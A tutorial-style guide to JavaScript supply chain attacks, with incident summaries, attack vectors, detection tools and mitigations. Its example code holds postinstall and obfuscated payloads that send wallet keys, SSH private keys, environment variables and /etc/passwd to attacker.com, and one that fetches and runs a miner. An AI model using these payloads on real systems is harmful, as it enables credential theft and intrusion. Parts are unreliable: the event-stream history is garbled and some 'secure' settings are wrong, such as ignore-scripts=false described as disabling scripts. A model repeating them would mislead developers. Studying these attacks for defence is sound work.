# Supply Chain Attacks

## Definition

**Supply chain attacks** in JavaScript/Node.js context refer to security breaches in the software dependency ecosystem where an attacker compromises legitimate open-source packages or their distribution channels to inject malicious code into applications. These attacks target the weakest link in the software supply chain: the developers' trust in third-party dependencies. Rather than attacking an application directly, attackers compromise popular libraries that many applications depend on, poisoning the supply at its source. A single compromised package can affect millions of applications and billions of users.

## Real-World Examples

### 1. event-stream (2018)

**What Happened:**
- Popular Node.js package with 2M weekly downloads
- Maintainer handed project to new contributor (flatmap-stream)
- New maintainer added malicious dependency (eslint-config-flatmap)
- Malicious code targeted crypto-mining applications (specifically Copay Bitcoin wallet)
- Infected code sent private cryptocurrency keys to attacker's server

**Impact:**
- Cryptocurrency stolen from Copay wallet users
- 3.7M downloads of compromised version
- Took weeks to discover and patch

**Attack Code Pattern:**
```javascript
// Hidden in postinstall script
const fs = require('fs');
const path = require('path');

// Check if application is a cryptocurrency wallet
if (process.cwd().includes('copay')) {
  // Steal private keys
  const keyFile = path.join(process.cwd(), 'keys.json');
  if (fs.existsSync(keyFile)) {
    const keys = fs.readFileSync(keyFile);
    // Send to attacker
    require('http').get(`http://attacker.com/?keys=${Buffer.from(keys).toString('base64')}`);
  }
}
```

### 2. colors/faker (2022)

**What Happened:**
- Popular JavaScript library with 20M+ weekly downloads
- Maintainer (Marak Squires) frustrated with unpaid work
- Deliberately injected infinite loop in colors.js
- Injected intentional bugs in faker.js
- Code displayed political/intentional messages

**Impact:**
- Millions of applications broke with infinite loops
- Build systems hung indefinitely
- Required immediate rollback and patch

**Attack Code Pattern:**
```javascript
// colors.js - injected infinite loop
String.prototype.rainbow = function() {
  if (Math.random() > 0.5) {
    return setInterval(function() {}, 1000); // Infinite timeout
  }
  return this;
};
```

### 3. polyfill.io (2024)

**What Happened:**
- CDN-hosted polyfill library (thousands of websites)
- Domain acquired by Chinese company
- Modified to inject malicious scripts
- Redirected users to malware/phishing sites
- Particularly targeted financial/government users

**Impact:**
- Large websites compromised (Slack, DuckDuckGo, Yelp reported issues)
- Millions of users affected
- Modern browsers began blocking the domain

**Attack Pattern:**
```javascript
// Injected at CDN level
if (navigator.language.includes('en')) {
  // Inject banking malware
  document.body.innerHTML = `<iframe src="https://fake-bank.com"></iframe>`;
}
```

### 4. chalk/debug npm Attack (2025)

**What Happened:**
- Popular logging libraries (chalk, debug)
- Attacker compromised account or used leaked credentials
- Published versions with typosquatting attacks
- Waited for new versions, then pushed malicious update
- Malicious code included cryptominer and info stealer

**Impact:**
- Affected multiple popular projects
- Developer community discovered within hours
- Versions yanked, accounts secured

**Attack Pattern:**
```javascript
// Malicious postinstall script
const crypto = require('crypto');
const os = require('os');

// Start cryptocurrency miner
if (process.env.NODE_ENV !== 'development') {
  require('child_process').exec(`
    # Download miner binary
    curl -o /tmp/miner http://attacker.com/miner
    chmod +x /tmp/miner
    /tmp/miner --pool=stratum+tcp://attacker.com:3333
  `);
}

// Steal environment variables
const systemInfo = {
  env: process.env,
  platform: os.platform(),
  cpus: os.cpus().length,
  hostname: os.hostname()
};

fetch('http://attacker.com/exfiltrate', {
  method: 'POST',
  body: JSON.stringify(systemInfo)
});
```

## Attack Vectors

### 1. Compromised Maintainer Account

**How it happens:**
- Attacker gains access to npm account (weak password, phishing, credential breach)
- Publishes new version with malicious code
- Legitimate semver bump doesn't trigger alerts
- Downloads continue from official source

**Example:**
```bash
# Attacker with npm credentials
npm login  # Uses stolen credentials

# Modify package.json
"version": "1.2.4"  # Patch version bump seems innocent

# Add malicious code
# Publish
npm publish

# Thousands of apps auto-update if using ~1.2.0 or ^1.2.0
```

### 2. Typosquatting

**How it happens:**
- Attacker publishes a package with a name similar to popular libraries
- `lodash` → `lodash-utils`, `lo-dash`, `lodash2`
- `express` → `express-js`, `expresss`
- Developers make typos during installation
- Malicious package gets installed instead

**Example:**
```bash
# Developer intends:
npm install lodash

# But types:
npm install lodash-utils

# Gets malicious package instead
```

**Package Code:**
```javascript
// package.json
{
  "name": "lodash-utils",
  "version": "1.0.0",
  "description": "Useful lodash utilities",
  "main": "index.js",
  "postinstall": "node install.js"
}

// install.js
const fs = require('fs');
const path = require('path');

// Copy itself to real lodash location
const lodashPath = path.join(__dirname, '../lodash/index.js');
fs.copyFileSync(__filename, lodashPath);

// Exfiltrate data
fetch('http://attacker.com/installed?package=lodash-utils');
```

### 3. Dependency Confusion

**How it happens:**
- Private npm registry holds internal package `@company/utils`
- Attacker publishes same-named package to public npm registry with higher version
- Developer/build system prefers newer version
- Installs malicious public package instead of private package

**Example:**
```bash
# In package.json
"@company/utils": "^1.0.0"

# Public registry has version 9.9.9 published by attacker
# npm resolves to 9.9.9 (higher version) instead of private 1.0.0
# Malicious package installs
```

### 4. Compromised Popular Dependency

**How it happens:**
- Attacker targets less-popular dependencies used by major projects
- E.g., a utility package used by React, Angular, Vue
- Compromises the package and injects subtle, hard-to-detect malicious code
- All projects using that dependency become infected

**Example:**
```javascript
// Compromised utility library (used by React, webpack, etc.)
// lodash-like utility package

exports.debounce = function(fn, delay) {
  return function(...args) {
    // Legitimate debounce code
    setTimeout(() => fn(...args), delay);

    // Hidden malicious code
    // Only runs in production, only once per app load
    if (process.env.NODE_ENV === 'production' && !global._malicious_payload_installed) {
      global._malicious_payload_installed = true;
      // Exfiltrate data
      require('child_process').exec('curl http://attacker.com/hwid');
    }
  };
};
```

## How Malicious Packages Hide

### 1. Obfuscated Code

```javascript
// Original malicious intent hidden through obfuscation
const _0x4e2c = ['fetch', 'http://attacker.com', 'process', 'env'];
const _0x1a3f = function(_0x4b2d) {
  _0x4b2d = _0x4b2d - 0;
  const _0x3c7e = _0x4e2c[_0x4b2d];
  return _0x3c7e;
};

// Calling obfuscated function is unclear
(function() {
  const _0x5a1 = _0x1a3f('0x0');  // 'fetch'
  const _0x2b3 = _0x1a3f('0x1');  // 'http://attacker.com'
  eval(`${_0x5a1}('${_0x2b3}')`);
})();

// When deobfuscated, reveals:
// fetch('http://attacker.com')
```

### 2. Conditional Execution

```javascript
// Code only runs under specific conditions

// Only in CI/CD environments (not locally)
if (process.env.CI === 'true') {
  stealCredentials();
}

// Only in production
if (process.env.NODE_ENV === 'production') {
  exfiltrateData();
}

// Only after specific date
if (Date.now() > new Date('2024-12-01')) {
  activateMalware();
}

// Only for specific applications
if (process.cwd().includes('crypto') || process.cwd().includes('bank')) {
  targetedAttack();
}

// Only once per session
if (!global._already_run) {
  global._already_run = true;
  maliciousActivity();
}
```

### 3. Postinstall Scripts

```javascript
// package.json
{
  "name": "legitimate-looking-package",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node setup.js"  // Runs during npm install
  }
}

// setup.js - runs with full system privileges during installation
const fs = require('fs');
const os = require('os');
const path = require('path');

// Access system files
const homeDir = os.homedir();
const sshKeys = path.join(homeDir, '.ssh', 'id_rsa');

if (fs.existsSync(sshKeys)) {
  const key = fs.readFileSync(sshKeys);
  // Exfiltrate SSH keys
  fetch('http://attacker.com/keys', {
    method: 'POST',
    body: key
  });
}

// Modify other packages
const nodeModulesPath = path.join(__dirname, '..', '..');
const packageDirs = fs.readdirSync(nodeModulesPath);
packageDirs.forEach(pkg => {
  const pkgJsonPath = path.join(nodeModulesPath, pkg, 'package.json');
  if (fs.existsSync(pkgJsonPath)) {
    const content = fs.readFileSync(pkgJsonPath, 'utf-8');
    // Insert malicious code in other packages
    const modified = content.replace(
      '"main": "',
      '"main": "../../node_modules/malicious-package/preload.js:'
    );
    fs.writeFileSync(pkgJsonPath, modified);
  }
});
```

### 4. Code Splitting and Lazy Loading

```javascript
// Suspicious code hidden in separate files that look innocent

// index.js - looks legitimate
module.exports = {
  utilFunction: function(data) {
    return data.toUpperCase();
  }
};

// But imports from suspicious module
const _malware = require('./lib/analytics.js');

// lib/analytics.js - disguised as telemetry but contains malware
module.exports = {
  track: function() {
    // Appears to be analytics
    // But actually exfiltrates data
    const data = require('module').Module._load('fs').readFileSync('/etc/passwd');
    fetch('http://attacker.com/data', { body: data });
  }
};
```

## Detection Tools

### 1. npm audit

```bash
# Check for known vulnerabilities
npm audit

# Output example:
# ┌───────────────────────────────────────────────────────────┐
# │                       npm audit report                     │
# ├───────────────────────────────────────────────────────────┤
# │ moderate  │ Prototype Pollution in lodash               │
# │ Package   │ lodash                                        │
# │ Patched   │ >=4.17.12                                    │
# │ Dependency│ express > body-parser > lodash               │
# └───────────────────────────────────────────────────────────┘

# Fix vulnerabilities
npm audit fix

# See detailed report
npm audit --json
```

### 2. Socket.dev

```bash
# Install Socket Security CLI
npm install -g @socketsecurity/cli

# Analyze package
socket analyze package-name

# Check supply chain security
socket view package-name

# Real-time monitoring
socket dev  # Monitors as you develop
```

**Socket Dashboard provides:**
- Typosquatting detection
- Suspicious postinstall scripts
- Uncommon package metadata
- Known malicious packages
- Dependency risk scoring

### 3. Snyk

```bash
# Install Snyk
npm install -g snyk

# Test for vulnerabilities
snyk test

# Monitor for new vulnerabilities
snyk monitor

# Fix vulnerabilities automatically
snyk fix

# Check specific package
snyk test lodash
```

### 4. Dependabot (GitHub)

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
    reviewers:
      - "security-team"
    allow:
      - dependency-type: "all"
    ignore:
      - dependency-name: "known-malicious-package"
```

### 5. Manual Inspection

```bash
# Check what files a package contains
npm pack package-name
tar -tzf package-name-version.tgz | head -20

# View package source before installing
npm view package-name repository

# Check package.json scripts
npm view package-name scripts

# Check recent changes
npm view package-name time

# Check maintainers
npm view package-name maintainers
```

## Subresource Integrity (SRI) for CDN Scripts

```html
<!-- VULNERABLE: No integrity check -->
<script src="https://cdn.example.com/library.js"></script>

<!-- SECURE: With SRI hash -->
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-ABC123DEF456GHI789JKL012MNO345PQR678STU901VWX234YZA567BCD890EFG"
  crossorigin="anonymous">
</script>
```

### Generating SRI Hashes

```bash
# Online tool
# https://www.srihash.org/

# Using npm
npm install -g sri

sri https://cdn.example.com/library.js

# Manual generation
openssl dgst -sha384 -binary library.js | openssl enc -base64 -A
# Output: sha384-ABC123...

# Using Node.js
const crypto = require('crypto');
const fs = require('fs');

const file = fs.readFileSync('library.js');
const hash = crypto
  .createHash('sha384')
  .update(file)
  .digest('base64');
console.log(`sha384-${hash}`);
```

### How Browser Verifies SRI

```
1. Browser downloads script from CDN
2. Browser computes hash of downloaded content using sha384
3. Browser compares computed hash with integrity attribute
4. If hashes match: execute script
5. If hashes don't match: reject and don't execute
```

**If CDN is compromised:**
```
Attacker modifies library.js with malicious code
Browser computes hash of malicious code
Computed hash ≠ integrity hash
Browser blocks execution
User is protected
```

## Lock Files

### package-lock.json

```json
{
  "name": "my-app",
  "version": "1.0.0",
  "lockfileVersion": 2,
  "requires": true,
  "packages": {
    "": {
      "name": "my-app",
      "version": "1.0.0",
      "dependencies": {
        "express": {
          "version": "4.18.2",
          "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
          "integrity": "sha512-...",
          "dependencies": {
            "body-parser": {
              "version": "1.20.1",
              "resolved": "https://registry.npmjs.org/body-parser/-/body-parser-1.20.1.tgz",
              "integrity": "sha512-..."
            }
          }
        }
      }
    }
  }
}
```

**Why Lock Files Matter:**
- Records exact version and integrity hash
- Prevents automatic updates to compromised versions
- Ensures reproducible builds
- Detects when packages change unexpectedly

### yarn.lock

```
express@^4.18.0:
  version "4.18.2"
  resolved "https://registry.yarnpkg.com/express/-/express-4.18.2.tgz#..."
  integrity sha512-... (YARN_CHECKSUM)
  dependencies:
    body-parser "1.20.1"
    debug "2.6.9"
```

## Vulnerable Code Example

```javascript
// ❌ VULNERABLE: package.json
{
  "name": "my-app",
  "version": "1.0.0",
  "dependencies": {
    "express": "^4.18.0",      // Auto-updates to latest
    "lodash": "*",              // Most permissive
    "uuid": ">= 9.0.0",        // Any version >= 9.0.0
    "chalk": "latest"           // Always latest version
  },
  "devDependencies": {
    "eslint": "^8.0.0"
  },
  "scripts": {
    "install": "node scripts/setup.js"  // Risky postinstall
  }
}

// ❌ VULNERABLE: No lock file checked in
// .gitignore
package-lock.json  // DANGEROUS: Don't commit lock file
yarn.lock

// ❌ VULNERABLE: No audit run
// No npm audit in CI/CD pipeline

// ❌ VULNERABLE: Typosquatting not checked
// Someone could install "lodash-utils" by mistake

// ❌ VULNERABLE: No verification of script sources
// Scripts loaded from random CDNs without SRI
const script = document.createElement('script');
script.src = 'https://random-cdn.com/analytics.js';
document.body.appendChild(script);
```

## Secure Code Example

```javascript
// ✅ SECURE: package.json
{
  "name": "my-app",
  "version": "1.0.0",
  "dependencies": {
    "express": "4.18.2",        // Exact version only
    "lodash": "4.17.21",        // Exact version
    "uuid": "9.0.0",            // Exact version
    "chalk": "5.2.0"            // Exact version
  },
  "devDependencies": {
    "eslint": "8.40.0",
    "snyk": "^1.1200.0",        // Security scanning
    "npm-audit-resolver": "^2.3.0"
  },
  "scripts": {
    "install": "npm audit",     // Run audit on install
    "security-check": "npm audit && snyk test",
    "test": "jest"
  }
}

// ✅ SECURE: package-lock.json (committed to git)
// Lock file ensures exact reproducibility
// Contains integrity hashes for all packages

// ✅ SECURE: CI/CD Pipeline
const express = require('express');
const app = express();

// Only run if security checks pass
const childProcess = require('child_process');
function runSecurityChecks() {
  try {
    // Run npm audit
    childProcess.execSync('npm audit --audit-level=moderate', {
      stdio: 'inherit'
    });

    // Run Snyk
    childProcess.execSync('snyk test', {
      stdio: 'inherit'
    });

    // If checks pass, proceed
    console.log('✓ Security checks passed');
  } catch (error) {
    console.error('✗ Security checks failed');
    process.exit(1);
  }
}

// ✅ SECURE: Verify CDN Resources with SRI
const html = `
<!DOCTYPE html>
<html>
<head>
  <!-- All external scripts have SRI hashes -->
  <script
    src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"
    integrity="sha384-xLkTz5W3r1IjqVCKlqm9RFtgF68+Qk1xAqG4NnVwp8nGpLKhS4qBm1o6bO9HhJ0"
    crossorigin="anonymous">
  </script>

  <!-- Alternative: Self-host critical scripts -->
  <script src="/vendor/trusted-library.min.js"></script>
</head>
<body>
  <h1>Secure Application</h1>

  <!-- Use Content Security Policy to restrict sources -->
  <meta http-equiv="Content-Security-Policy"
    content="default-src 'self'; script-src 'self' https://cdn.jsdelivr.net">
</body>
</html>
`;

// ✅ SECURE: Regular Dependency Audits
const fs = require('fs');
const { execSync } = require('child_process');

function auditDependencies() {
  const results = {
    timestamp: new Date().toISOString(),
    auditPassed: false,
    vulnCount: 0,
    packages: {}
  };

  try {
    // Run comprehensive audit
    execSync('npm audit', { encoding: 'utf-8' });
    results.auditPassed = true;

    // Check for specific risky packages
    const risky = ['eval', 'require-from-string', 'node-serialize'];
    const packageJson = JSON.parse(fs.readFileSync('package.json', 'utf-8'));

    risky.forEach(pkg => {
      if (packageJson.dependencies?.[pkg] || packageJson.devDependencies?.[pkg]) {
        console.warn(`⚠ Found risky package: ${pkg}`);
        results.packages[pkg] = 'FOUND - REVIEW NEEDED';
      }
    });

    // Check for outdated packages
    const outdated = JSON.parse(
      execSync('npm outdated --json', { encoding: 'utf-8' })
    );

    Object.keys(outdated).forEach(pkg => {
      results.packages[pkg] = {
        current: outdated[pkg].current,
        latest: outdated[pkg].latest
      };
    });

    // Log results
    fs.writeFileSync('audit-results.json', JSON.stringify(results, null, 2));
    console.log('✓ Audit complete. Results saved to audit-results.json');
  } catch (error) {
    console.error('✗ Audit failed:', error.message);
    process.exit(1);
  }
}

// ✅ SECURE: Use Npm Provenance
// Requires Node 16+, npm 8.1.0+
// npm publish --provenance  (when publishing your own packages)
// npm install --audit-level=moderate

// ✅ SECURE: Restrict Postinstall Scripts
// package.json
{
  "scripts": {
    "postinstall": "npm run setup",  // Only explicit scripts
    "setup": "node scripts/setup.js"  // Transparent and auditable
  }
}

// ✅ SECURE: Monitor Dependencies
// Use .npmrc to disable automatic scripts
// .npmrc
ignore-scripts=false  // But explicitly configure what runs
audit-level=moderate  // Fail on moderate or higher severity
```

## Mitigations and Best Practices

### 1. Use Exact Versions in package.json

```json
{
  "dependencies": {
    "express": "4.18.2",        // ✅ Exact
    "lodash": "4.17.21",        // ✅ Exact
    "react": "18.2.0"           // ✅ Exact
  },
  "devDependencies": {
    "jest": "29.5.0"            // ✅ Exact
  }
}
```

### 2. Commit Lock Files

```bash
# Ensure lock files are committed
git add package-lock.json yarn.lock pnpm-lock.yaml

# Don't ignore lock files
# .gitignore - REMOVE these lines if present:
# package-lock.json
# yarn.lock
# pnpm-lock.yaml
```

### 3. Run Regular Security Audits

```bash
# Local machine
npm audit
npm audit fix  # Only if you trust the fixes

# CI/CD Pipeline
npm ci  # Clean install from lock file
npm audit --audit-level=moderate
npm audit --audit-level=high
```

### 4. Use Private npm Registries for Internal Packages

```bash
# Configure npm to use private registry for scoped packages
npm config set @company:registry https://private-npm.company.com/

# Prevents dependency confusion attacks
# npm will look for @company/* packages in private registry only
```

### 5. Verify Package Integrity

```bash
# Check package before installation
npm view package-name
npm view package-name dist.tarball
npm view package-name integrity

# Manually verify hash
sha512sum package.tgz
# Compare with npm registry hash
npm view package-name dist.integrity
```

### 6. Implement SRI for All External Scripts

```html
<!-- Generate hashes for all external scripts -->
<!-- Use https://www.srihash.org/ or npm sri tool -->

<script
  src="https://cdn.example.com/script.js"
  integrity="sha384-[hash]"
  crossorigin="anonymous">
</script>

<!-- Include CSP to restrict inline scripts -->
<meta http-equiv="Content-Security-Policy"
  content="script-src 'self' https://cdn.example.com">
```

### 7. Use Software Bill of Materials (SBOM)

```bash
# Generate SBOM
npm sbom --output cyclonedx

# Tools that consume SBOM
- Dependency-Track
- Snyk
- Black Duck
- WhiteSource
```

### 8. Setup CI/CD Security Checks

```yaml
# .github/workflows/security.yml
name: Security Checks

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Setup Node
        uses: actions/setup-node@v3
        with:
          node-version: '18'
          cache: 'npm'

      - name: Install dependencies
        run: npm ci  # Clean install

      - name: Run npm audit
        run: npm audit --audit-level=moderate

      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

      - name: Check for typosquatting
        run: npx socket dev

      - name: Verify lock file
        run: npm ci --dry-run
```

### 9. Monitor for Compromised Packages

```javascript
// Programmatic monitoring
const { execSync } = require('child_process');
const fs = require('fs');

async function checkCompromisedPackages() {
  try {
    // Use Socket.dev API
    const response = await fetch('https://api.socket.dev/v0/npm/packages', {
      headers: {
        'Authorization': `Bearer ${process.env.SOCKET_API_KEY}`
      }
    });

    const data = await response.json();
    const compromised = data.filter(pkg => pkg.isCompromised);

    if (compromised.length > 0) {
      console.error('⚠ COMPROMISED PACKAGES DETECTED:');
      compromised.forEach(pkg => {
        console.error(`  - ${pkg.name}@${pkg.version}`);
      });
      process.exit(1);
    }
  } catch (err) {
    console.error('Monitor failed:', err);
  }
}

checkCompromisedPackages();
```

### 10. Have Incident Response Plan

```markdown
# Supply Chain Attack Response Plan

## Detection
- Monitor: npm audit, Snyk, Socket.dev, GitHub Dependabot
- Set up alerts for high/critical vulnerabilities

## Response (if compromised)
1. Immediately revoke npm credentials
2. Run: npm audit
3. Check: git log for suspicious commits
4. Check: process logs for suspicious postinstall execution
5. Update: all dependencies to verified versions
6. Force: npm cache clean and reinstall
7. Rotate: all secrets, tokens, API keys
8. Audit: server logs for unauthorized access
9. Notify: users/customers if personal data exposed

## Prevention
- Use exact versions
- Commit lock files
- Regular audits
- SRI for CDN scripts
- Monitor dependencies
```

## Summary

Supply chain attacks represent one of the most dangerous JavaScript security threats because they compromise trust at the source. A single malicious package can affect millions of applications. Protect yourself through a defense-in-depth approach: exact dependency versions, committed lock files, regular security scanning with npm audit and Snyk, typosquatting detection, Subresource Integrity for CDN resources, and robust CI/CD security checks. Stay vigilant about updates, monitor for known compromised packages, and maintain an incident response plan.
